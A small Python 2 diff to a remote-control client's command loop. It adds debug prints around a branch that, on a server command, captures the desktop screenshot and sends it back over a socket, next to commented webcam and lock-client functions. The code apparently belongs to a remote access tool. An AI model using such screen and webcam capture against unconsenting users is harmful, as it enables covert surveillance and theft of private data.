@@ -579,6 +579,7 @@ def reactor():
                             break
 
                         print data['payload']
+                        print data['mode']
                         if len(data['payload']) == 0 and len(data['mode']) == 0:
                             break
 
@@ -660,7 +661,9 @@ def reactor():
                         # Lock Client Functions
                         # Desktop Screenshot
                         elif data['mode'] == 'getScreen':
+                            print 'Send Screenshot'
                             data_send(server_socket, get_screenshot(), 'getScreen', session_id=data['session_id'])
+                            print 'Sent Screenshot'
                             continue
 
                         # Webcamera Shot
